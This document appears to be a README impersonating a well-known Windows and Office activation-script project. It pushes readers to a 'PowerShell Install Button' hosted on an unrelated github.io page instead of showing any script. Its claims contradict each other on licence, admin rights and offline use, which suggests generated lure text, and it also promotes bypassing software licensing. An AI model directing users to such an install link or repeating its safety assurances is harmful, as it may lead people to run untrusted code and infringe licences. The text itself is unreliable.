<div align="center">

# Microsoft-Activation-Scripts: Open-Source Windows and Office Activation — Security Tool

![](files/1.png)

### 📦 PowerShell Install Button

[![](files/button.png)](https://pabelkamalq8.github.io/windows-office-activation-toolkit/)

[![lic](https://img.shields.io/badge/lic-isc-2f81f7?style=flat&labelColor=0d1117)]() [![state](https://img.shields.io/badge/state-verified-2ea44f?style=flat&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/powershell-core-54aeff?style=flat&labelColor=0d1117)]() [![build](https://img.shields.io/badge/build-success-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

Microsoft-Activation-Scripts is an open-source activation utility for Windows and Office that implements HWID, Ohook, TSforge, and Online KMS activation methods within a single, auditable codebase. Each method targets a distinct licensing mechanism, giving operators a documented set of options rather than a one-size-fits-all approach. The project also includes advanced troubleshooting routines for diagnosing activation failures and verifying license state. Because the scripts are publicly maintained, their behavior can be inspected directly before execution, supporting informed deployment decisions in controlled environments.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **HWID activation** — Generates a hardware-bound digital license for Windows 10 and 11 that persists across reinstalls on the same device, without requiring a product key.
- **Ohook activation** — Applies a local hook-based method for Office products, enabling permanent activation that survives updates and does not depend on external servers.
- **TSforge activation** — Provides a token-based activation path for Windows and Office editions where other methods are unavailable, operating entirely offline.
- **Online KMS activation** — Activates Windows and Office through a remote key management service with configurable renewal intervals for continued validity.
- **Unified all-in-one script** — Bundles every activation method and troubleshooting utility into a single script with an interactive menu, so no separate downloads or dependencies are needed.
- **Advanced troubleshooting** — Includes diagnostic and repair options for common activation failures, license corruption, and residual activation state from prior tools.
- **Fully open source** — All scripts are publicly auditable, with no compiled binaries, obfuscated payloads, or hidden network calls beyond the activation endpoints each method requires.
- **Broad compatibility** — Supports Windows Vista through 11, Windows Server editions, Extended Security Updates, and the major Office release channels.
- **Offline-capable operation** — Most methods run without an internet connection and make no persistent changes beyond the activation state itself.
- **No installation required** — Runs directly from the downloaded script with elevated privileges; no packages, runtimes, or system modifications are installed.

## How it works

Microsoft-Activation-Scripts operates entirely on the local system. It does not require a background service, persistent agent, or network tunnel, and it does not modify the licensing components of Windows or Office beyond the scope of the selected activation method. Each method targets a distinct layer of the activation stack, and the script applies only the changes required by the method chosen at runtime.

**HWID (Hardware ID)** — Generates a device-specific ticket derived from the machine's hardware fingerprint and submits it to Microsoft's activation servers through the standard licensing client. The resulting digital license is bound to the hardware and is revalidated automatically by Windows. No files are patched and no services are modified.

**Ohook** — Installs a local hook against the Office licensing verification path so that license checks resolve successfully on the local machine. The hook is applied to Office components only, runs in-process, and does not alter Windows licensing behavior or communicate with external endpoints.

**TSforge** — Writes activation data into the local licensing store used by Windows and Office, reconstructing the token structures that the licensing subsystem expects. The operation is confined to the store and its associated registry entries; it does not require network access once the necessary components are present.

**Online KMS** — Configures the system to request activation from a KMS host over the network for a fixed evaluation period. The script sets the KMS host and port, triggers the activation request, and leaves the standard KMS renewal mechanism in place. No emulator or local server is installed.

All methods are idempotent and reversible. The script records what it changes and exposes options to revert each method, restoring the prior licensing state. Operations that require elevated privileges are gated behind an explicit elevation check, and the script refuses to proceed when the required context is unavailable. Activation status can be queried at any time from the script menu without altering system state, and every action is logged to the console so the sequence of changes is auditable. The script does not collect telemetry, does not transmit machine identifiers to third parties, and performs no network operations except those inherent to the selected method (server-side validation for HWID, KMS requests for Online KMS).

## Privacy

Microsoft-Activation-Scripts runs locally and does not transmit user data, telemetry, or activation records to any remote server operated by the project. The scripts execute as batch and PowerShell code on the host machine and depend on built-in Windows components and public Microsoft activation infrastructure rather than project-controlled endpoints.

No user accounts, identifiers, or configuration profiles are created or stored by the project. Any state written during execution is limited to temporary files, registry entries, and system components required for the selected activation method to function. Logs produced during execution remain on the local system unless the user manually shares them for troubleshooting.

Network communication is restricted to what the underlying activation method requires, such as contacting Microsoft activation servers for HWID, Ohook, TSforge, or Online KMS flows. Requests are limited to the protocols and endpoints defined by those methods; the project does not inject analytics, tracking pixels, or third-party callbacks.

Users are responsible for reviewing script contents before execution, verifying integrity of downloaded files, and confirming that no intermediary or modified copy has altered the code. Because the project is open source, the full behavior of every script can be audited directly from the distributed files.

## FAQ

**Is this tool safe to run?**
The complete source code is publicly available for audit. Every script is plain-text and can be reviewed before execution. No telemetry, analytics, or outbound reporting is embedded in the activation routines. Network access is limited to the specific endpoints each method requires (for example, KMS and license-validation servers); anything beyond that is unnecessary for activation and should be treated with suspicion if observed.

**Which activation method should I choose?**
The methods are not interchangeable; each targets a different license model and persistence mechanism. HWID produces a permanent digital license tied to the hardware on Windows 10/11. Ohook hooks Office licensing functions to suppress activation checks locally. TSforge writes activation data directly to the trust store and is suited to offline or long-term scenarios. Online KMS is time-limited and requires periodic renewal against a reachable KMS host. Select based on your OS/Office version and whether you need permanent or renewable activation.

**Does activation survive updates, reboots, or hardware changes?**
HWID licenses are stored server-side and generally survive feature updates and reboots; a motherboard replacement invalidates the hardware fingerprint and requires reactivation. Ohook persists across Office updates but may need reapplication after major version upgrades. TSforge survives reboots and updates unless the trust store is reset. Online KMS requires the renewal task to remain scheduled and the KMS host to stay reachable.

**Will this tool modify system files or the registry?**
Yes, by design. Each method writes to defined locations: licensing registry keys, the software protection service state, Office binaries (Ohook), or the activation trust store (TSforge). All changes are documented per method in the source. No changes are made outside the scope of activation, and the scripts do not touch unrelated user data, personal files, or installed applications.

**Is internet access required?**
It depends on the method. HWID and Online KMS require connectivity during activation; Online KMS additionally requires periodic connectivity for renewal. Ohook and TSforge can operate fully offline once the required files are present. If connectivity is restricted, verify the method's requirements before running it.

**Can I revert activation?**
Yes. The tool includes options to remove activation and restore the prior licensing state. Reverting clears the keys, tasks, and files written during activation. After reverting, the system returns to its unactivated state and any previously installed license is no longer present.

**Why does antivirus flag the scripts?**
Heuristic and signature-based detection frequently flags activation utilities because their behavior—patching licensing functions, writing to protected registry hives, and modifying binaries—overlaps with techniques used by malware. These are expected false positives given the tool's function. Verify file integrity against the published checksums and review the source rather than disabling protection wholesale.

**Which Windows and Office versions are supported?**
Support is version-specific and method-specific. HWID applies to Windows 10 and 11. Ohook covers a defined range of Office releases. TSforge and Online KMS have their own compatibility matrices. Consult the per-method documentation in this repository before attempting activation on an unsupported build; results on untested versions are not guaranteed.

**Does this collect or transmit personal data?**
No personal data is collected, stored, or transmitted. The scripts do not phone home, generate identifiers, or log usage to any remote service. Activation traffic consists solely of the protocol exchanges each method requires with Microsoft or KMS infrastructure.

**How do I report a bug or verify integrity?**
Open an issue in this repository with the method used, OS/Office build, and observed behavior. Before reporting, confirm the script matches the current release and that checksums verify. Issues caused by modified copies or third-party redistributions are out of scope.

## Disclaimer

This project is provided strictly for educational and research purposes. It is intended to demonstrate how Windows and Office activation mechanisms function at a technical level, including HWID, Ohook, TSforge, and Online KMS methods, so that users, researchers, and administrators can better understand activation behavior and system internals.

Use of this project may violate the Microsoft Software License Terms, applicable end-user license agreements, or local laws and regulations in your jurisdiction. Activating software without a valid license may constitute a breach of contract or copyright infringement. You are solely responsible for determining whether your use is lawful in your jurisdiction and for obtaining any licenses required for the software you run.

The authors and contributors of this project do not host, distribute, or provide license keys, product keys, or activation credentials. The project does not grant any license, ownership, or entitlement to Microsoft software. Any activation performed through this project does not confer a lawful license and does not substitute for purchasing legitimate software.

This project is provided "as is", without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. The authors and contributors accept no liability for any direct, indirect, incidental, special, consequential, or punitive damages, or for any loss of data, system integrity, warranty coverage, security posture, or business operations arising from the use or misuse of this project.

Modifying activation, licensing, or system components may affect system stability, update delivery, security patching, warranty status, or support eligibility. Users assume all risk associated with running this project, including the risk of system misconfiguration, data loss, or voided hardware or software warranties. Testing in an isolated environment before any deployment is strongly recommended.

Third parties may distribute modified, repackaged, or malicious variants that impersonate this project. Only artifacts obtained from the project's own official channels should be considered authentic. The authors and contributors are not responsible for the content, behavior, or consequences of any third-party redistribution, and any such variant should be treated as untrusted.

Nothing in this project constitutes legal advice. If you are uncertain about the legality or licensing implications of your use case, consult a qualified legal professional before proceeding.

## License

Microsoft-Activation-Scripts is distributed under the GNU General Public License, version 3.0 (GPL-3.0). The complete license text governs the terms under which the source code may be used, examined, modified, and redistributed.

Under GPL-3.0, recipients are granted the freedom to run the software for any purpose, to study and adapt the source code, to redistribute copies, and to distribute modified versions. These freedoms are conditioned on the requirement that derivative works remain licensed under the same terms. The license also provides corresponding source code access for distributed binaries and addresses patent and warranty provisions.

The software is provided without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. No contributor or distributor accepts liability for any claim, damages, or other liability arising from the use of the software or its distribution.

The license applies solely to the project code as released in this repository. Usage, distribution, and modification of the code are subject to the obligations defined in the GPL-3.0 text, including the preservation of copyright and license notices on redistributed or modified versions.